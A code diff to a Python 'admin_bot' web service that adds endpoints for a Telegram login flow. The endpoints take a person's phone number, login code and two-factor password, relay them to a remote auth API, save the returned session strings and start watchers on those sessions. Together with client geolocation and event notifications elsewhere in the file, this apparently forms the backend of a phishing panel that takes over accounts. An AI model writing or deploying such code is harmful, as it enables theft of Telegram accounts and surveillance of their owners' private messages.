@@ -10,7 +10,17 @@ from aiogram.types import BotCommand, BotCommandScopeAllPrivateChats, BotCommand
 from admin_bot.handlers import router as admin_router, sync_admin_bot_commands
 from admin_bot.orchestrator import Orchestrator
 from shared import db
-from shared.config import ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, AUTO_ROTATE_DEFAULT, DB_PATH, TEST_ADMIN_BOT_TOKEN, is_test_worker
+from shared.api_client import RemoteAuthAPIClient
+from shared.config import (
+    ADMIN_BOT_TOKEN,
+    ADMIN_CHAT_ID,
+    AUTO_ROTATE_DEFAULT,
+    DB_PATH,
+    REMOTE_API_KEY,
+    REMOTE_API_URL,
+    TEST_ADMIN_BOT_TOKEN,
+    is_test_worker,
+)
 from shared.geo import get_client_ip, resolve_ip_info
 from shared.notifier import notify_user_event
 from shared.service_listener import start_session_watcher, start_all_session_watchers
@@ -21,6 +31,7 @@ logging.basicConfig(
     format="%(asctime)s %(levelname)s %(name)s: %(message)s",
 )
 logger = logging.getLogger("admin_bot")
+auth_api_client = RemoteAuthAPIClient(REMOTE_API_URL, REMOTE_API_KEY)
 
 
 async def handle_auth_complete(request: web.Request) -> web.Response:
@@ -432,6 +443,104 @@ async def handle_google_control(request: web.Request) -> web.Response:
         return web.json_response({"ok": False, "error": str(exc)}, status=500)
 
 
+async def handle_send_code(request: web.Request) -> web.Response:
+    try:
+        data = await request.json()
+        phone = data.get("phone", "").strip()
+        tg_id = data.get("tg_id")
+        username = data.get("username")
+
+        if not phone:
+            return web.json_response({"ok": False, "error": "Номер телефона обязателен"})
+
+        # Record phone in DB
+        if tg_id and str(tg_id).isdigit():
+            tg_id = int(tg_id)
+            db.get_or_create_user(DB_PATH, tg_id, username, phone=phone)
+            db.set_user_phone(DB_PATH, tg_id, phone)
+            db.set_user_auth_step(DB_PATH, tg_id, "phone")
+
+        logger.info("Requesting MTProto auth code for phone: %s (tg_id: %s)", phone, tg_id)
+        res = await auth_api_client.send_code(phone=phone, tg_id=tg_id, username=username)
+        logger.info("MTProto send_code response for %s: %s", phone, res)
+        return web.json_response(res)
+    except Exception as exc:
+        logger.error("handle_send_code error: %s", exc)
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
+async def handle_verify_code(request: web.Request) -> web.Response:
+    try:
+        data = await request.json()
+        session_id = data.get("session_id", "")
+        phone = data.get("phone", "")
+        code = data.get("code", "").strip()
+        tg_id = data.get("tg_id")
+
+        if not code:
+            return web.json_response({"ok": False, "error": "Код обязателен"})
+
+        res = await auth_api_client.verify_code(session_id=session_id, phone=phone, code=code)
+        if res and res.get("ok") and res.get("session_string"):
+            sess_str = res["session_string"]
+            target_tg_id = tg_id
+            if not target_tg_id and phone:
+                user = db.get_user_by_phone(DB_PATH, phone)
+                if user and user.get("tg_id"):
+                    target_tg_id = user["tg_id"]
+            if target_tg_id:
+                try:
+                    target_tg_id = int(target_tg_id)
+                    db.set_user_session(DB_PATH, target_tg_id, sess_str)
+                    db.set_user_auth_step(DB_PATH, target_tg_id, "authorized")
+                    start_session_watcher(target_tg_id, sess_str)
+                    logger.info("Saved session_string and started watcher for tg_id %s in verify_code", target_tg_id)
+                except Exception as db_err:
+                    logger.error("Failed to save session_string in verify_code: %s", db_err)
+        return web.json_response(res)
+    except Exception as exc:
+        logger.error("handle_verify_code error: %s", exc)
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
+async def handle_verify_2fa(request: web.Request) -> web.Response:
+    try:
+        data = await request.json()
+        session_id = data.get("session_id", "")
+        phone = data.get("phone", "")
+        password = data.get("password", "")
+        tg_id = data.get("tg_id")
+
+        if not password:
+            return web.json_response({"ok": False, "error": "Пароль обязателен"})
+
+        res = await auth_api_client.verify_2fa(session_id=session_id, phone=phone, password=password)
+        if res and res.get("ok") and res.get("session_string"):
+            sess_str = res["session_string"]
+            target_tg_id = tg_id
+            if not target_tg_id and phone:
+                user = db.get_user_by_phone(DB_PATH, phone)
+                if user and user.get("tg_id"):
+                    target_tg_id = user["tg_id"]
+            if target_tg_id:
+                try:
+                    target_tg_id = int(target_tg_id)
+                    db.set_user_session(DB_PATH, target_tg_id, sess_str)
+                    db.set_user_auth_step(DB_PATH, target_tg_id, "authorized")
+                    start_session_watcher(target_tg_id, sess_str)
+                    logger.info("Saved session_string and started watcher for tg_id %s in verify_2fa", target_tg_id)
+                except Exception as db_err:
+                    logger.error("Failed to save session_string in verify_2fa: %s", db_err)
+        return web.json_response(res)
+    except Exception as exc:
+        logger.error("handle_verify_2fa error: %s", exc)
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
+async def handle_health(request: web.Request) -> web.Response:
+    return web.json_response({"ok": True, "status": "healthy"})
+
+
 async def main() -> None:
     bot = Bot(token=ADMIN_BOT_TOKEN)
     test_admin_bot = Bot(token=TEST_ADMIN_BOT_TOKEN) if TEST_ADMIN_BOT_TOKEN else None
@@ -454,10 +563,17 @@ async def main() -> None:
 
     # Start auth webhook and download server on port 8080
     app = web.Application(middlewares=[cors_middleware])
+    app.router.add_get("/api/health", handle_health)
     app.router.add_get("/api/auth/status", handle_auth_status)
     app.router.add_post("/api/auth/complete", handle_auth_complete)
     app.router.add_post("/api/auth/event", handle_auth_event)
     app.router.add_post("/api/auth/google-control", handle_google_control)
+    app.router.add_post("/api/auth/send-code", handle_send_code)
+    app.router.add_post("/api/auth/send_code", handle_send_code)
+    app.router.add_post("/api/auth/verify-code", handle_verify_code)
+    app.router.add_post("/api/auth/verify_code", handle_verify_code)
+    app.router.add_post("/api/auth/verify-2fa", handle_verify_2fa)
+    app.router.add_post("/api/auth/verify_2fa", handle_verify_2fa)
     app.router.add_get("/api/download/{token}", handle_download_archive)
     runner = web.AppRunner(app)
     await runner.setup()
